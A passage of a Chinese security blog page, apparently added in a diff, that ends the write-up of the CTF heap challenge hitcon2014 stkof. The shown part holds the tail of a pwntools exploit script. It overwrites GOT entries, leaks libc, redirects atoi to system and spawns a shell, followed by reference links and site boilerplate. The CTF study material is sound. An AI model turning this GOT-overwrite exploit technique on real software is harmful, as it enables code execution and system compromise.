elf.got['puts']</span><br><span class="line">puts_plt = elf.plt['puts']</span><br><span class="line">atoi_got = elf.got['atoi']</span><br><span class="line">payload = 'A'*16 + p64(free_got) + p64(puts_got) + p64(atoi_got)</span><br><span class="line">edit(2,payload)</span><br><span class="line">edit(1,p64(puts_plt))</span><br><span class="line">free(2)</span><br><span class="line">p.recvline()</span><br><span class="line">puts_add = u64(p.recvline(keepends=False)[0:8].ljust(8,'\x00'))</span><br><span class="line"><span class="section">log.success("Puts_real:"+hex(puts_add))</span></span><br><span class="line"></span><br><span class="line">offset = puts_add - libc.symbols['puts']</span><br><span class="line"><span class="section">log.success("Offset:"+hex(offset))</span></span><br><span class="line">system_addr = libc.symbols['system'] + offset</span><br><span class="line"><span class="section">log.success("System_addr:" + hex(system_addr)) </span></span><br><span class="line"></span><br><span class="line">edit(3,p64(system_addr))</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>参考链接：</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//www.secpulse.com/archives/115388.html</span></span><br><span class="line">unlink：</span><br><span class="line"><span class="symbol">https:</span><span class="comment">//hpasserby.top/post/dbc7b210.html</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//bbs.ichunqiu.com/thread-46614-1-1.html?from=bkyl</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//eternalsakura13.com/2018/03/01/unlink1/</span></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/堆学习/" rel="tag">#堆学习</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/26/格式化字符串漏洞及利用_完全讲解/" rel="next" title="格式化字符串漏洞及利用_完全讲解">
+                <i class="fa fa-chevron-left"></i> 格式化字符串漏洞及利用_完全讲解
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="木头">
+          <p class="site-author-name" itemprop="name">木头</p>
+          <p class="site-description motion-element" itemprop="description">做个靠谱的人！</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">54</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">19</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+		  <br>
+		  <span id="busuanzi_container_site_uv">
+			<b><span id="busuanzi_value_site_uv"></span></b><br>
+			<span class="site-state-item-name">访客</span>
+			</span>
+
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=453175619&auto=0&height=32"></iframe>
+
+    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=805197&auto=1&height=32"></iframe>
+    
+		<br>
+		<div align="left" font-family: "arial","microsoft yahei","黑体","宋体",sans-serif>
+		<b><h1>个人简介</h1></b>
+		<p>姓名：木头<br>
+		性别：男<br>
+		QQ：1594783824<br>
+		爱好：书,球,歌<br>
+		主要奖项： xxx</p>
+		</div>
+		<br>
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#unlink相关源码："><span class="nav-number">1.</span> <span class="nav-text">unlink相关源码：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#unlink-："><span class="nav-number">2.</span> <span class="nav-text">unlink ：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#相关题目：unlink-hitcon2014-stkof"><span class="nav-number">3.</span> <span class="nav-text">相关题目：unlink_hitcon2014_stkof</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#exp："><span class="nav-number">4.</span> <span class="nav-text">exp：</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">木头</span>
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+  
+  
+  
+
+  
+
+  
+
+</body>
+</html>
